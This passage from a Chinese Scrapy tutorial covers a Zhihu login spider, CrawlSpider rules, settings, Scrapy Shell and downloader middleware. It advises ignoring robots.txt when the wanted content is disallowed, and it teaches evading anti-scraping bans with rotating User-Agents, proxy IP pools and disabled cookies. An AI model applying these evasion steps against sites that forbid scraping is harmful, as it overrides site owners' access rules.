scrapy.linkextractors import LinkExtractor\nfrom scrapy import Request, FormRequest\nfrom zhihu.items import ZhihuItem\n\nclass ZhihuSipder(CrawlSpider) :\n    name = \"zhihu\"\n    allowed_domains = [\"www.zhihu.com\"]\n    start_urls = [\n        \"http://www.zhihu.com\"\n    ]\n    rules = (\n        Rule(LinkExtractor(allow = ('/question/\\d+#.*?', )), callback = 'parse_page', follow = True),\n        Rule(LinkExtractor(allow = ('/question/\\d+', )), callback = 'parse_page', follow = True),\n    )\n\n    headers = {\n        \"Accept\": \"*/*\",\n        \"Accept-Language\": \"en-US,en;q=0.8,zh-TW;q=0.6,zh;q=0.4\",\n        \"Connection\": \"keep-alive\",\n        \"Content-Type\":\" application/x-www-form-urlencoded; charset=UTF-8\",\n        \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2125.111 Safari/537.36\",\n        \"Referer\": \"http://www.zhihu.com/\"\n    }\n\n    #重写了爬虫类的方法, 实现了自定义请求, 运行成功后会调用callback回调函数\n    def start_requests(self):\n        return [Request(\"https://www.zhihu.com/login\", meta = {'cookiejar' : 1}, callback = self.post_login)]\n\n    def post_login(self, response):\n        print 'Preparing login'\n        #下面这句话用于抓取请求网页后返回网页中的_xsrf字段的文字, 用于成功提交表单\n        xsrf = response.xpath('//input[@name=\"_xsrf\"]/@value').extract()[0]\n        print xsrf\n        #FormRequeset.from_response是Scrapy提供的一个函数, 用于post表单\n        #登陆成功后, 会调用after_login回调函数\n        return [FormRequest.from_response(response,   #\"http://www.zhihu.com/login\",\n                            meta = {'cookiejar' : response.meta['cookiejar']},\n                            headers = self.headers,  #注意此处的headers\n                            formdata = {\n                            '_xsrf': xsrf,\n                            'email': '123456@qq.com',\n                            'password': '123456'\n                            },\n                            callback = self.after_login,\n                            dont_filter = True\n                            )]\n\n    def after_login(self, response) :\n        for url in self.start_urls :\n            yield self.make_requests_from_url(url)\n\n    def parse_page(self, response):\n        problem = Selector(response)\n        item = ZhihuItem()\n        item['url'] = response.url\n        item['name'] = problem.xpath('//span[@class=\"name\"]/text()').extract()\n        print item['name']\n        item['title'] = problem.xpath('//h2[@class=\"zm-item-title zm-editable-content\"]/text()').extract()\n        item['description'] = problem.xpath('//div[@class=\"zm-editable-content\"]/text()').extract()\n        item['answer']= problem.xpath('//div[@class=\" zm-editable-content clearfix\"]/text()').extract()\n        return item\n```\n\nItem类设置\n\n```python\nfrom scrapy.item import Item, Field\n\nclass ZhihuItem(Item):\n    # define the fields for your item here like:\n    # name = scrapy.Field()\n    url = Field()  #保存抓取问题的url\n    title = Field()  #抓取问题的标题\n    description = Field()  #抓取问题的描述\n    answer = Field()  #抓取问题的答案\n    name = Field()  #个人用户的名称\n```\n\nsetting.py 设置抓取间隔\n\n```python\nBOT_NAME = 'zhihu'\n\nSPIDER_MODULES = ['zhihu.spiders']\nNEWSPIDER_MODULE = 'zhihu.spiders'\nDOWNLOAD_DELAY = 0.25   #设置下载间隔为250ms\n```\n\n## Settings\n\nScrapy设置(settings)提供了定制Scrapy组件的方法。可以控制包括核心(core)，插件(extension)，pipeline及spider组件。比如 设置Json Pipeliine、LOG_LEVEL等。\n\n参考文档：http://scrapy-chs.readthedocs.io/zh_CN/1.0/topics/settings.html#topics-settings-ref\n\n内置设置参考手册\n\n- `BOT_NAME`\n\n  - 默认: 'scrapybot'\n  - 当您使用 startproject 命令创建项目时其也被自动赋值。\n\n- `CONCURRENT_ITEMS`\n\n  - 默认: 100\n  - Item Processor(即 Item Pipeline) 同时处理(每个response的)item的最大值。\n\n- `CONCURRENT_REQUESTS`\n\n  - 默认: 16\n  - Scrapy downloader 并发请求(concurrent requests)的最大值。\n\n-  `DEFAULT_REQUEST_HEADERS`\n\n  - 默认: 如下\n\n    ```\n    {\n    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',\n    'Accept-Language': 'en',\n    }\n    ```\n\n    Scrapy HTTP Request使用的默认header。\n\n- `DEPTH_LIMIT`\n\n  - 默认: 0\n  - 爬取网站最大允许的深度(depth)值。如果为0，则没有限制。\n\n- `DOWNLOAD_DELAY`\n\n  - 默认: 0\n  - 下载器在下载同一个网站下一个页面前需要等待的时间。该选项可以用来限制爬取速度， 减轻服务器压力。同时也支持小数:\n\n  `DOWNLOAD_DELAY = 0.25 # 250 ms of delay`\n\n  - 默认情况下，Scrapy在两个请求间不等待一个固定的值， 而是使用0.5到1.5之间的一个随机值 * DOWNLOAD_DELAY 的结果作为等待间隔。\n\n- `DOWNLOAD_TIMEOUT`\n\n  - 默认: 180\n  - 下载器超时时间(单位: 秒)。\n\n- `ITEM_PIPELINES`\n\n  - 默认: {}\n\n  - 保存项目中启用的pipeline及其顺序的字典。该字典默认为空，值(value)任意，不过值(value)习惯设置在0-1000范围内，值越小优先级越高。\n\n    ```\n    ITEM_PIPELINES = {\n    'mySpider.pipelines.SomethingPipeline': 300,\n    'mySpider.pipelines.ItcastJsonPipeline': 800,\n    }\n    ```\n\n- `LOG_ENABLED`\n\n  - 默认: True\n  - 是否启用logging。\n\n- `LOG_ENCODING`\n\n  - 默认: 'utf-8'\n  - logging使用的编码。\n\n- `LOG_LEVEL`\n\n  - 默认: 'DEBUG'\n  - log的最低级别。可选的级别有: CRITICAL、 ERROR、WARNING、INFO、DEBUG 。\n\n- `USER_AGENT`\n\n  - 默认: \"Scrapy/VERSION (+[http://scrapy.org](http://scrapy.org/))\"\n  - 爬取的默认User-Agent，除非被覆盖。\n\n- `PROXIES`： 代理设置\n\n  - 示例：\n\n    ```\n    PROXIES = [\n      {'ip_port': '111.11.228.75:80', 'password': ''},\n      {'ip_port': '120.198.243.22:80', 'password': ''},\n      {'ip_port': '111.8.60.9:8123', 'password': ''},\n      {'ip_port': '101.71.27.120:80', 'password': ''},\n      {'ip_port': '122.96.59.104:80', 'password': ''},\n      {'ip_port': '122.224.249.122:8088', 'password':''},\n    ]\n    ```\n\n-  `COOKIES_ENABLED = False`\n\n  - 禁用Cookies\n  \n- `ROBOTSTXT_OBEY = True`\n\n  ​     通俗来说， robots.txt 是遵循 Robot协议 的一个文件，它保存在网站的服务器中，它的作用是，告诉搜索引擎爬虫，本网站哪些目录下的网页 不希望 你进行爬取收录。在Scrapy启动后，会在第一时间访问网站的 robots.txt 文件，然后决定该网站的爬取范围。\n\n  当然，我们并不是在做搜索引擎，而且在某些情况下我们想要获取的内容恰恰是被 robots.txt 所禁止访问的。所以，某些时候，我们就要将此配置项设置为 False ，拒绝遵守 Robot协议 ！  \n\n## CrawlSpiders\n\n> 通过下面的命令可以快速创建 CrawlSpider模板 的代码：\n>\n> ```\n> scrapy genspider -t crawl [爬虫名] [域名]\n> ```\n\n上一个案例中，我们通过正则表达式，制作了新的url作为Request请求参数，现在我们可以换个花样...\n\n```\nclass scrapy.spiders.CrawlSpider\n```\n\n它是Spider的派生类，Spider类的设计原则是只爬取start_url列表中的网页，而CrawlSpider类定义了一些规则(rule)来提供跟进link的方便的机制，从爬取的网页中获取link并继续爬取的工作更适合。\n\n### 源码参考\n\n```python\nclass CrawlSpider(Spider):\n    rules = ()\n    def __init__(self, *a, **kw):\n        super(CrawlSpider, self).__init__(*a, **kw)\n        self._compile_rules()\n\n    #首先调用parse()来处理start_urls中返回的response对象\n    #parse()则将这些response对象传递给了_parse_response()函数处理，并设置回调函数为parse_start_url()\n    #设置了跟进标志位True\n    #parse将返回item和跟进了的Request对象    \n    def parse(self, response):\n        return self._parse_response(response, self.parse_start_url, cb_kwargs={}, follow=True)\n\n    #处理start_url中返回的response，需要重写\n    def parse_start_url(self, response):\n        return []\n\n    def process_results(self, response, results):\n        return results\n\n    #从response中抽取符合任一用户定义'规则'的链接，并构造成Resquest对象返回\n    def _requests_to_follow(self, response):\n        if not isinstance(response, HtmlResponse):\n            return\n        seen = set()\n        #抽取之内的所有链接，只要通过任意一个'规则'，即表示合法\n        for n, rule in enumerate(self._rules):\n            links = [l for l in rule.link_extractor.extract_links(response) if l not in seen]\n            #使用用户指定的process_links处理每个连接\n            if links and rule.process_links:\n                links = rule.process_links(links)\n            #将链接加入seen集合，为每个链接生成Request对象，并设置回调函数为_repsonse_downloaded()\n            for link in links:\n                seen.add(link)\n                #构造Request对象，并将Rule规则中定义的回调函数作为这个Request对象的回调函数\n                r = Request(url=link.url, callback=self._response_downloaded)\n                r.meta.update(rule=n, link_text=link.text)\n                #对每个Request调用process_request()函数。该函数默认为indentify，即不做任何处理，直接返回该Request.\n                yield rule.process_request(r)\n\n    #处理通过rule提取出的连接，并返回item以及request\n    def _response_downloaded(self, response):\n        rule = self._rules[response.meta['rule']]\n        return self._parse_response(response, rule.callback, rule.cb_kwargs, rule.follow)\n\n    #解析response对象，会用callback解析处理他，并返回request或Item对象\n    def _parse_response(self, response, callback, cb_kwargs, follow=True):\n        #首先判断是否设置了回调函数。（该回调函数可能是rule中的解析函数，也可能是 parse_start_url函数）\n        #如果设置了回调函数（parse_start_url()），那么首先用parse_start_url()处理response对象，\n        #然后再交给process_results处理。返回cb_res的一个列表\n        if callback:\n            #如果是parse调用的，则会解析成Request对象\n            #如果是rule callback，则会解析成Item\n            cb_res = callback(response, **cb_kwargs) or ()\n            cb_res = self.process_results(response, cb_res)\n            for requests_or_item in iterate_spider_output(cb_res):\n                yield requests_or_item\n\n        #如果需要跟进，那么使用定义的Rule规则提取并返回这些Request对象\n        if follow and self._follow_links:\n            #返回每个Request对象\n            for request_or_item in self._requests_to_follow(response):\n                yield request_or_item\n\n    def _compile_rules(self):\n        def get_method(method):\n            if callable(method):\n                return method\n            elif isinstance(method, basestring):\n                return getattr(self, method, None)\n\n        self._rules = [copy.copy(r) for r in self.rules]\n        for rule in self._rules:\n            rule.callback = get_method(rule.callback)\n            rule.process_links = get_method(rule.process_links)\n            rule.process_request = get_method(rule.process_request)\n\n    def set_crawler(self, crawler):\n        super(CrawlSpider, self).set_crawler(crawler)\n        self._follow_links = crawler.settings.getbool('CRAWLSPIDER_FOLLOW_LINKS', True)\n```\n\nCrawlSpider继承于Spider类，除了继承过来的属性外（name、allow_domains），还提供了新的属性和方法:\n\n### rules\n\nCrawlSpider使用rules来决定爬虫的爬取规则，并将匹配后的url请求提交给引擎。所以在正常情况下，CrawlSpider不需要单独手动返回请求了。\n\n在rules中包含一个或多个Rule对象，每个Rule对爬取网站的动作定义了某种特定操作，比如提取当前相应内容里的特定链接，是否对提取的链接跟进爬取，对提交的请求设置回调函数等。\n\n如果多个rule匹配了相同的链接，则根据规则在本集合中被定义的顺序，第一个会被使用。\n\n```python\nclass scrapy.spiders.Rule(\n        link_extractor, \n        callback = None, \n        cb_kwargs = None, \n        follow = None, \n        process_links = None, \n        process_request = None\n)\n```\n\n- `link_extractor`：是一个Link Extractor对象，用于定义需要提取的链接。\n\n- `callback`： 从link_extractor中每获取到链接时，参数所指定的值作为回调函数，该回调函数接受一个response作为其第一个参数。\n\n  > 注意：当编写爬虫规则时，避免使用parse作为回调函数。由于CrawlSpider使用parse方法来实现其逻辑，如果覆盖了 parse方法，crawl spider将会运行失败。\n\n- `follow`：是一个布尔(boolean)值，指定了根据该规则从response提取的链接是否需要跟进。 如果callback为None，follow 默认设置为True ，否则默认为False。\n\n- `process_links`：指定该spider中哪个的函数将会被调用，从link_extractor中获取到链接列表时将会调用该函数。该方法主要用来过滤。\n\n- `process_request`：指定该spider中哪个的函数将会被调用， 该规则提取到每个request时都会调用该函数。 (用来过滤request)\n\n### LinkExtractors\n\n```python\nclass scrapy.linkextractors.LinkExtractor\n```\n\nLink Extractors 的目的很简单: 提取链接｡\n\n每个LinkExtractor有唯一的公共方法是 extract_links()，它接收一个 Response 对象，并返回一个 scrapy.link.Link 对象。\n\nLink Extractors要实例化一次，并且 extract_links 方法会根据不同的 response 调用多次提取链接｡\n\n```python\nclass scrapy.linkextractors.LinkExtractor(\n    allow = (),\n    deny = (),\n    allow_domains = (),\n    deny_domains = (),\n    deny_extensions = None,\n    restrict_xpaths = (),\n    tags = ('a','area'),\n    attrs = ('href'),\n    canonicalize = True,\n    unique = True,\n    process_value = None\n)\n```\n\n主要参数：\n\n- `allow`：满足括号中“正则表达式”的URL会被提取，如果为空，则全部匹配。\n- `deny`：满足括号中“正则表达式”的URL一定不提取（优先级高于allow）。\n- `allow_domains`：会被提取的链接的domains。\n- `deny_domains`：一定不会被提取链接的domains。\n- `restrict_xpaths`：使用xpath表达式，和allow共同作用过滤链接。\n\n### 爬取规则(Crawling rules)\n\n继续用腾讯招聘为例，给出配合rule使用CrawlSpider的例子:\n\n1. 首先运行\n\n   ```sh\n    scrapy shell \"http://hr.tencent.com/position.php?&start=0#a\"\n   ```\n\n2. 导入LinkExtractor，创建LinkExtractor实例对象。：\n\n   ```python\n    from scrapy.linkextractors import LinkExtractor\n   \n    page_lx = LinkExtractor(allow=('position.php?&start=\\d+'))\n   ```\n\n   > allow : LinkExtractor对象最重要的参数之一，这是一个正则表达式，必须要匹配这个正则表达式(或正则表达式列表)的URL才会被提取，如果没有给出(或为空), 它会匹配所有的链接｡\n   >\n   > deny : 用法同allow，只不过与这个正则表达式匹配的URL不会被提取)｡它的优先级高于 allow 的参数，如果没有给出(或None), 将不排除任何链接｡\n\n3. 调用LinkExtractor实例的extract_links()方法查询匹配结果：\n\n   ```python\n    page_lx.extract_links(response)\n   ```\n\n4. 没有查到：\n\n   ```python\n    []\n   ```\n\n5. 注意转义字符的问题，继续重新匹配：\n\n   ```python\n    page_lx = LinkExtractor(allow=('position\\.php\\?&start=\\d+'))\n    # page_lx = LinkExtractor(allow = ('start=\\d+'))\n   \n    page_lx.extract_links(response)\n   ```\n\n![img](http://www.nikola.ltd/s/python/Spider/file/images/tencent_rule.png)\n\n### CrawlSpider 版本\n\n那么，scrapy shell测试完成之后，修改以下代码\n\n```python\n#提取匹配 'http://hr.tencent.com/position.php?&start=\\d+'的链接\npage_lx = LinkExtractor(allow = ('start=\\d+'))\n\nrules = [\n    #提取匹配,并使用spider的parse方法进行分析;并跟进链接(没有callback意味着follow默认为True)\n    Rule(page_lx, callback = 'parse', follow = True)\n]\n```\n\n**这么写对吗？**\n\n**不对！千万记住 callback 千万不能写 parse，再次强调：由于CrawlSpider使用parse方法来实现其逻辑，如果覆盖了 parse方法，crawl spider将会运行失败。**\n\n```python\n#tencent.py\n\nimport scrapy\nfrom scrapy.spiders import CrawlSpider, Rule\nfrom scrapy.linkextractors import LinkExtractor\nfrom mySpider.items import TencentItem\n\nclass TencentSpider(CrawlSpider):\n    name = \"tencent\"\n    allowed_domains = [\"hr.tencent.com\"]\n    start_urls = [\n        \"http://hr.tencent.com/position.php?&start=0#a\"\n    ]\n\n    page_lx = LinkExtractor(allow=(\"start=\\d+\"))\n\n    rules = [\n        Rule(page_lx, callback = \"parseContent\", follow = True)\n    ]\n\n    def parseContent(self, response):\n        for each in response.xpath('//*[@class=\"even\"]'):\n            name = each.xpath('./td[1]/a/text()').extract()[0]\n            detailLink = each.xpath('./td[1]/a/@href').extract()[0]\n            positionInfo = each.xpath('./td[2]/text()').extract()[0]\n\n            peopleNumber = each.xpath('./td[3]/text()').extract()[0]\n            workLocation = each.xpath('./td[4]/text()').extract()[0]\n            publishTime = each.xpath('./td[5]/text()').extract()[0]\n            #print name, detailLink, catalog,recruitNumber,workLocation,publishTime\n\n            item = TencentItem()\n            item['name']=name.encode('utf-8')\n            item['detailLink']=detailLink.encode('utf-8')\n            item['positionInfo']=positionInfo.encode('utf-8')\n            item['peopleNumber']=peopleNumber.encode('utf-8')\n            item['workLocation']=workLocation.encode('utf-8')\n            item['publishTime']=publishTime.encode('utf-8')\n\n            yield item\n\n    # parse() 方法不需要重写     \n    # def parse(self, response):                                              \n    #     pass\n```\n\n运行： `scrapy crawl tencent`\n\n## Logging\n\nScrapy提供了log功能，可以通过 logging 模块使用。\n\n> 可以修改配置文件settings.py，任意位置添加下面两行，效果会清爽很多。\n\n```\nLOG_FILE = \"TencentSpider.log\"\nLOG_LEVEL = \"INFO\"\n```\n\n### Log levels\n\n- Scrapy提供5层logging级别:\n- CRITICAL - 严重错误(critical)\n- ERROR - 一般错误(regular errors)\n- WARNING - 警告信息(warning messages)\n- INFO - 一般信息(informational messages)\n- DEBUG - 调试信息(debugging messages)\n\n### logging设置 \n\n通过在setting.py中进行以下设置可以被用来配置logging:\n\n1. `LOG_ENABLED` 默认: True，启用logging\n2. `LOG_ENCODING` 默认: 'utf-8'，logging使用的编码\n3. `LOG_FILE` 默认: None，在当前目录里创建logging输出文件的文件名\n4. `LOG_LEVEL` 默认: 'DEBUG'，log的最低级别\n5. `LOG_STDOUT` 默认: False 如果为 True，进程所有的标准输出(及错误)将会被重定向到log中。例如，执行 print \"hello\" ，其将会在Scrapy log中显示。\n\n## Scrapy Shell\n\nScrapy终端是一个交互终端，我们可以在未启动spider的情况下尝试及调试代码，也可以用来测试XPath或CSS表达式，查看他们的工作方式，方便我们爬取的网页中提取的数据。\n\n如果安装了 IPython ，Scrapy终端将使用 IPython (替代标准Python终端)。 IPython 终端与其他相比更为强大，提供智能的自动补全，高亮输出，及其他特性。（推荐安装IPython）\n\n### 启动Scrapy Shell\n\n进入项目的根目录，执行下列命令来启动shell:\n\n```python\nscrapy shell \"http://www.itcast.cn/channel/teacher.shtml\"\n```\n\n![img](http://www.nikola.ltd/s/python/Spider/file/images/scrapy_shell.png)\n\nScrapy Shell根据下载的页面会自动创建一些方便使用的对象，例如 Response 对象，以及 `Selector 对象 (对HTML及XML内容)`。\n\n- 当shell载入后，将得到一个包含response数据的本地 response 变量，输入 `response.body`将输出response的包体，输出 `response.headers` 可以看到response的包头。\n- 输入 `response.selector` 时， 将获取到一个response 初始化的类 Selector 的对象，此时可以通过使用 `response.selector.xpath()`或`response.selector.css()` 来对 response 进行查询。\n- Scrapy也提供了一些快捷方式, 例如 `response.xpath()`或`response.css()`同样可以生效（如之前的案例）。\n\n### Selectors选择器\n\nScrapy Selectors 内置 XPath 和 CSS Selector 表达式机制\n\nSelector有四个基本的方法，最常用的还是xpath:\n\n- xpath(): 传入xpath表达式，返回该表达式所对应的所有节点的selector list列表\n- extract(): 序列化该节点为Unicode字符串并返回list\n- css(): 传入CSS表达式，返回该表达式所对应的所有节点的selector list列表，语法同 BeautifulSoup4\n- re(): 根据传入的正则表达式对数据进行提取，返回Unicode字符串list列表\n\nXPath表达式的例子及对应的含义:\n\n```html\n/html/head/title: 选择<HTML>文档中 <head> 标签内的 <title> 元素\n/html/head/title/text(): 选择上面提到的 <title> 元素的文字\n//td: 选择所有的 <td> 元素\n//div[@class=\"mine\"]: 选择所有具有 class=\"mine\" 属性的 div 元素\n```\n\n尝试Selector\n\n我们用腾讯社招的网站http://hr.tencent.com/position.php?&start=0#a举例：\n\n```python\n# 启动\nscrapy shell \"http://hr.tencent.com/position.php?&start=0#a\"\n\n# 返回 xpath选择器对象列表\nresponse.xpath('//title')\n[<Selector xpath='//title' data=u'<title>\\u804c\\u4f4d\\u641c\\u7d22 | \\u793e\\u4f1a\\u62db\\u8058 | Tencent \\u817e\\u8baf\\u62db\\u8058</title'>]\n\n# 使用 extract()方法返回 Unicode字符串列表\nresponse.xpath('//title').extract()\n[u'<title>\\u804c\\u4f4d\\u641c\\u7d22 | \\u793e\\u4f1a\\u62db\\u8058 | Tencent \\u817e\\u8baf\\u62db\\u8058</title>']\n\n# 打印列表第一个元素，终端编码格式显示\nprint response.xpath('//title').extract()[0]\n<title>职位搜索 | 社会招聘 | Tencent 腾讯招聘</title>\n\n# 返回 xpath选择器对象列表\nresponse.xpath('//title/text()')\n<Selector xpath='//title/text()' data=u'\\u804c\\u4f4d\\u641c\\u7d22 | \\u793e\\u4f1a\\u62db\\u8058 | Tencent \\u817e\\u8baf\\u62db\\u8058'>\n\n# 返回列表第一个元素的Unicode字符串\nresponse.xpath('//title/text()')[0].extract()\nu'\\u804c\\u4f4d\\u641c\\u7d22 | \\u793e\\u4f1a\\u62db\\u8058 | Tencent \\u817e\\u8baf\\u62db\\u8058'\n\n# 按终端编码格式显示\nprint response.xpath('//title/text()')[0].extract()\n职位搜索 | 社会招聘 | Tencent 腾讯招聘\n\nresponse.xpath('//*[@class=\"even\"]')\n职位名称:\n\nprint site[0].xpath('./td[1]/a/text()').extract()[0]\nTEG15-运营开发工程师（深圳）\n职位名称详情页:\n\nprint site[0].xpath('./td[1]/a/@href').extract()[0]\nposition_detail.php?id=20744&keywords=&tid=0&lid=0\n职位类别:\n\nprint site[0].xpath('./td[2]/text()').extract()[0]\n技术类\n```\n\n以后做数据提取的时候，可以把现在Scrapy Shell中测试，测试通过后再应用到代码中。\n\n当然Scrapy Shell作用不仅仅如此，但是不属于我们课程重点，不做详细介绍。\n\n官方文档：http://scrapy-chs.readthedocs.io/zh_CN/latest/topics/shell.html\n\n## 反反爬虫相关机制\n\nSome websites implement certain measures to prevent bots from crawling them, with varying degrees of sophistication. Getting around those measures can be difficult and tricky, and may sometimes require special infrastructure. Please consider contacting commercial support if in doubt.\n\n(有些些网站使用特定的不同程度的复杂性规则防止爬虫访问，绕过这些规则是困难和复杂的，有时可能需要特殊的基础设施，如果有疑问，请联系商业支持。)\n\n> 来自于Scrapy官方文档描述：http://doc.scrapy.org/en/master/topics/practices.html#avoiding-getting-banned\n\n通常防止爬虫被反主要有以下几个策略：\n\n- 动态设置User-Agent（随机切换User-Agent，模拟不同用户的浏览器信息）\n\n- 禁用Cookies（也就是不启用cookies middleware，不向Server发送cookies，有些网站通过cookie的使用发现爬虫行为）\n\n  - 可以通过`COOKIES_ENABLED` 控制 CookiesMiddleware 开启或关闭\n\n- 设置延迟下载（防止访问过于频繁，设置为 2秒 或更高）\n\n- Google Cache 和 Baidu Cache：如果可能的话，使用谷歌/百度等搜索引擎服务器页面缓存获取页面数据。\n\n- 使用IP地址池：VPN和代理IP，现在大部分网站都是根据IP来ban的。\n\n- 使用 [Crawlera](https://scrapinghub.com/crawlera)（专用于爬虫的代理组件），正确配置和设置下载中间件后，项目所有的request都是通过crawlera发出。\n\n  ```python\n    DOWNLOADER_MIDDLEWARES = {\n        'scrapy_crawlera.CrawleraMiddleware': 600\n    }\n  \n    CRAWLERA_ENABLED = True\n    CRAWLERA_USER = '注册/购买的UserKey'\n    CRAWLERA_PASS = '注册/购买的Password'\n  ```\n\n  \n\n### 设置下载中间件（Downloader Middlewares）\n\n下载中间件是处于引擎(crawler.engine)和下载器(crawler.engine.download())之间的一层组件，可以有多个下载中间件被加载运行。\n\n1. 当引擎传递请求给下载器的过程中，下载中间件可以对请求进行处理 （例如增加http header信息，增加proxy信息等）；\n2. 在下载器完成http请求，传递响应给引擎的过程中， 下载中间件可以对响应进行处理（例如进行gzip的解压等）\n\n要激活下载器中间件组件，将其加入到 DOWNLOADER_MIDDLEWARES 设置中。 该设置是一个字典(dict)，键为中间件类的路径，值为其中间件的顺序(order)。\n\n这里是一个例子:\n\n```python\nDOWNLOADER_MIDDLEWARES = {\n    'mySpider.middlewares.MyDownloaderMiddleware': 543,\n}\n```\n\n编写下载器中间件十分简单。每个中间件组件是一个定义了以下一个或多个方法的Python类:\n\n```python\nclass scrapy.contrib.downloadermiddleware.DownloaderMiddleware\n```\n\nprocess_request(self, request, spider)\n\n- 当每个request通过下载中间件时，该方法被调用。\n- process_request() 必须返回以下其中之一：一个 None 、一个 Response 对象、一个 Request 对象或 raise IgnoreRequest:\n  - 如果其返回 None ，Scrapy将继续处理该request，执行其他的中间件的相应方法，直到合适的下载器处理函数(download handler)被调用， 该request被执行(其response被下载)。\n  - 如果其返回 Response 对象，Scrapy将不会调用 任何 其他的 process_request() 或 process_exception() 方法，或相应地下载函数； 其将返回该response。 已安装的中间件的 process_response() 方法则会在每个response返回时被调用。\n  - 如果其返回 Request 对象，Scrapy则停止调用 process_request方法并重新调度返回的request。当新返回的request被执行后， 相应地中间件链将会根据下载的response被调用。\n  - 如果其raise一个 IgnoreRequest 异常，则安装的下载中间件的 process_exception() 方法会被调用。如果没有任何一个方法处理该异常， 则request的errback(Request.errback)方法会被调用。如果没有代码处理抛出的异常， 则该异常被忽略且不记录(不同于其他异常那样)。\n- 参数:\n  - `request (Request 对象)` – 处理的request\n  - `spider (Spider 对象)` – 该request对应的spider\n\nprocess_response(self, request, response, spider)\n\n当下载器完成http请求，传递响应给引擎的时候调用\n\n- process_request() 必须返回以下其中之一: 返回一个 Response 对象、 返回一个 Request 对象或raise一个 IgnoreRequest 异常。\n  - 如果其返回一个 Response (可以与传入的response相同，也可以是全新的对象)， 该response会被在链中的其他中间件的 process_response() 方法处理。\n  - 如果其返回一个 Request 对象，则中间件链停止， 返回的request会被重新调度下载。处理类似于 process_request() 返回request所做的那样。\n  - 如果其抛出一个 IgnoreRequest 异常，则调用request的errback(Request.errback)。 如果没有代码处理抛出的异常，则该异常被忽略且不记录(不同于其他异常那样)。\n- 参数:\n  - `request (Request 对象)` – response所对应的request\n  - `response (Response 对象)` – 被处理的response\n  - `spider (Spider 对象)` – response所对应的spider\n\n### 使用案例：\n\n1. 创建`middlewares.py`文件。\n\nScrapy代理IP、Uesr-Agent的切换都是通过`DOWNLOADER_MIDDLEWARES`进行控制，我们在`settings.py`同级目录下创建`middlewares.py`文件，包装所有请求。\n\n```python\n# middlewares.py\n\n#!/usr/bin/env python\n# -*- coding:utf-8 -*-\n\nimport random\nimport base64\n\nfrom settings import USER_AGENTS\nfrom settings import PROXIES\n\n# 随机的User-Agent\nclass RandomUserAgent(object):\n    def process_request(self, request, spider):\n        useragent = random.choice(USER_AGENTS)\n\n        request.headers.setdefault(\"User-Agent\", useragent)\n\nclass RandomProxy(object):\n    def process_request(self, request, spider):\n        proxy = random.choice(PROXIES)\n\n        if proxy['user_passwd'] is None:\n            # 没有代理账户验证的代理使用方式\n            request.meta['proxy'] = \"http://\" + proxy['ip_port']\n        else:\n            # 对账户密码进行base64编码转换\n            base64_userpasswd = base64.b64encode(proxy['user_passwd'])\n            # 对应到代理服务器的信令格式里\n            request.headers['Proxy-Authorization'] = 'Basic ' + base64_userpasswd\n            request.meta['proxy'] = \"http://\" + proxy['ip_port']\n```\n\n> 为什么HTTP代理要使用base64编码：\n>\n> HTTP代理的原理很简单，就是通过HTTP协议与代理服务器建立连接，协议信令中包含要连接到的远程主机的IP和端口号，如果有需要身份验证的话还需要加上授权信息，服务器收到信令后首先进行身份验证，通过后便与远程主机建立连接，连接成功之后会返回给客户端200，表示验证通过，就这么简单，下面是具体的信令格式：\n\n```\nCONNECT 59.64.128.198:21 HTTP/1.1\nHost: 59.64.128.198:21\nProxy-Authorization: Basic bGV2I1TU5OTIz\nUser-Agent: OpenFetion\n```\n\n> 其中`Proxy-Authorization`是身份验证信息，Basic后面的字符串是用户名和密码组合后进行base64编码的结果，也就是对username:password进行base64编码。\n\n```\nHTTP/1.0 200 Connection established\n```\n\n> OK，客户端收到收面的信令后表示成功建立连接，接下来要发送给远程主机的数据就可以发送给代理服务器了，代理服务器建立连接后会在根据IP地址和端口号对应的连接放入缓存，收到信令后再根据IP地址和端口号从缓存中找到对应的连接，将数据通过该连接转发出去。\n\n2. 修改settings.py配置USER_AGENTS和PROXIES\n\n- 添加USER_AGENTS：\n\n```python\n　　USER_AGENTS = [\n    \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)\",\n    \"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)\",\n    \"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)\",\n    \"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)\",\n    \"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6\",\n    \"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1\",\n    \"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0\",\n    \"Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5\"\n    ]\n```\n\n- 添加代理IP设置PROXIES：\n\n  免费代理IP可以网上搜索，或者付费购买一批可用的私密代理IP：\n\n```python\nPROXIES = [\n    {'ip_port': '111.8.60.9:8123', 'user_passwd': 'user1:pass1'},\n    {'ip_port': '101.71.27.120:80', 'user_passwd': 'user2:pass2'},\n    {'ip_port': '122.96.59.104:80', 'user_passwd': 'user3:pass3'},\n    {'ip_port': '122.224.249.122:8088', 'user_passwd': 'user4:pass4'},\n]\n```\n\n- 除非特殊需要，禁用cookies，防止某些网站根据Cookie来封锁爬虫。\n\n```\nCOOKIES_ENABLED = False\n```\n\n- 设置下载延迟\n\n```\nDOWNLOAD_DELAY = 3\n```\n\n- 最后设置setting.py里的DOWNLOADER_MIDDLEWARES，添加自己编写的下载中间件类。\n\n```python\nDOWNLOADER_MIDDLEWARES = {\n    #'mySpider.middlewares.MyCustomDownloaderMiddleware': 543,\n    'mySpider.middlewares.RandomUserAgent': 1,\n    'mySpider.middlewares.ProxyMiddleware': 100\n}\n```\n\n## 